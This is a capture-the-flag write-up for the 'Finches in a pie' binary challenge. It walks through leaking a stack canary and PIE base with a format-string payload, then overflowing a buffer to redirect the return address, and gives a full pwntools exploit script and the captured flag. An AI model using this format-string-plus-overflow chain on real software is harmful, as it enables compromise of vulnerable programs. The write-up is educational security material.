# Finches in a pie

###
`Exploit the service to get the flag.`

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

.got is still accessible but PIE making it worse.

* need to find out where the canary is located
* need to find out the application base offset

No ROP needed here, when `canary` is known, it is possible just rewrite return
address with `flag` address.

So the solution is : n * b'A' + p32(canary) + m * b'A' + p32(base + flag).

Detailed steps:
1. read out with %x stack values
2. check stack with gdb{x/32a $esp} with breakpoints on gets/printf
3. with first one printf we can find out application base offset,
   %3$x points on <say_hi+13> always with each call of this function.
4. with second gets do the same checks with gdb
5. just passing n * b'A' into second gets, manually narrow the place
   when you have this:
   ```
   *** stack smashing detected ***: terminated
   ```
6. now we know canary's location
7. easiest part is here, just find out return address and change it on flag function

```python
#!/usr/bin/env python3
from pwn import *

context.terminal = ['urxvt', '-e', 'sh', '-c']
context.log_level = 'debug'
debug = 0

if debug:
    io = gdb.debug(['./fiap'], gdbscript='''
b gets
b *(say_hi+202)
b *(say_hi+0xe5)
c
''')
else:
    #io = process(['./fiap'])
    io = remote('88.198.219.20', 49417)
binary = ELF('./fiap')
flag = binary.symbols['flag']
say_hi = binary.symbols['say_hi']

# 11 - canary, 3 -- say_hi + 13 
payload = b'%11$x %3$x '
io.recvuntil("What's your name?")
io.sendline(payload)
addrs = io.recvuntil("Thank you, ")
addrs = io.recvline().decode("utf-8")
addrs = addrs.split()
canary = int(addrs[0], 16)
pie = int(addrs[1], 16) - say_hi - 13

io.recvuntil("Would you like some cake?")
payload = 25*b'A' + p32(canary) + 12*b'A' + p32(pie + flag)
io.sendline(payload)

io.interactive()
#ractf{B4k1ng_4_p1E!}
```
